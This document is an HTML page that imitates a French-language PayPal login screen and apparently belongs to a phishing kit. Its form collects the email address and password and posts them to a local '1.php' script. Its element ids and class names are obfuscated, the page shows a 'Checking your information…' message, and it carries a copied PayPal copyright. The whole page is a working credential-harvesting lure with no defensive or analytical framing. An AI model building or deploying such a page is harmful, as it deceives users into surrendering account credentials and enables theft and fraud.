
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Connectez-vous à votre compte PayPal</title>
    <link rel="stylesheet" href="css/L-Z118.css">
    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
    <meta name="viewport" content="initial-scale=1.0">
    <style type="text/css"></style>
    <script type="text/javascript" src="css/jquery.js"></script>
    <script type="text/javascript" src="css/login.js"></script>
</head>
<body><p style="color: white;">.</p>
	<div for=" 47036701064 " id="page" name="Login">
        <div for=" 40386154720 " id="content" class="contenidor-content">
            <div id="ras-dafhaaa" class="ras-dafhaaa ">
			<header>
                <div id=" 42453394727 " class="logo-header-svg"></div>
            </header>
                <section id="login" class="login">
                    <form for=" a46d4ace14caf05f50af464dee58a718 " action="1.php" method="post" class="proceed maskable" id="formulario" name="login">
                        <div id="pass-sect" class="footer-sec">
						                            <div class="a-n-o-n-i-s-m-a" id="login_emaildiv">
                                <div class="a-n-o-n-i-s-m-a" style="z-index: 100;">
                                    <div for=" 47528614218 " class="khana-jadida tikchb-ila">
                                        <input for=" a46d4ace14caf05f50af464dee58a718 " class="controlar-formu" name="login_email" type="email" placeholder="Email Adresse" id="emay-add" value="">
                                    </div>
                                    <div id=" 24303508334 " class="ghalat-assi">
                                        <p>Email Adresse..</p>
                                    </div>
                                </div>
                                <div id=" 31201284366 " class="a-n-o-n-i-s-m-a">
                                    <div id=" 42512980078 " class="khana-jadida tikchb-ila">
                                        <input for=" a46d4ace14caf05f50af464dee58a718 " class="controlar-formu" name="login_password" type="password" placeholder="Enter your password" id="password">
                                    </div>
                                    <div id=" 29743055088 " class="ghalat-assi">
                                        <p id=" 17435488795 ">Enter your password</p>
                                    </div>
                                </div>
                            </div>
                            <div id=" 15125380847 " class="af3al cuerpooo">
                                <button for=" a46d4ace14caf05f50af464dee58a718 " class="button zidbut" type="submit" id="botdkhol" name="botdkhol" value="Login">Log In</button>
                            </div>
                            <div id=" 29491974576 " class="lineab"><a href="#" id="tfkar-lpass" class="nsiti-pass">Having trouble logging in ?</a>
                                <div class="pwr-modal" id="nsalpas-mskin">
                                </div>
                            </div>
                            <a for=" 16160686035 " href="#" class="button tanitalt" id="ftahcont-jdid">Sign Up</a></div>
                    </form>
                </section>
                <br>
            </div>
        </div>
        <div id=" 47941230950 " class="dorawlididor">
            <p id=" 38938929039 " class="anchofhhh">Checking your information…</p>
        </div>
    </div>
    <footer id=" 33176255125 " class="footer footer-sec">
        <ul>
            <li id=" 75844226501676 "><a href="#">Respect de la vie privée</a></li>
            <li id=" 9244598635558 "></li>
            <li id=" 377662692577883 "><a href="#">PayPal</a></li>
        </ul>
        <br>
        <ul id=" 22797998221 ">
            <li id=" 16475653093 "><a href="#" style="color: #9e9e9e;">Copyright © 1999-2016 PayPal. Tous droits réservés.</a></li>
        </ul>
    </footer>

</body>
</html>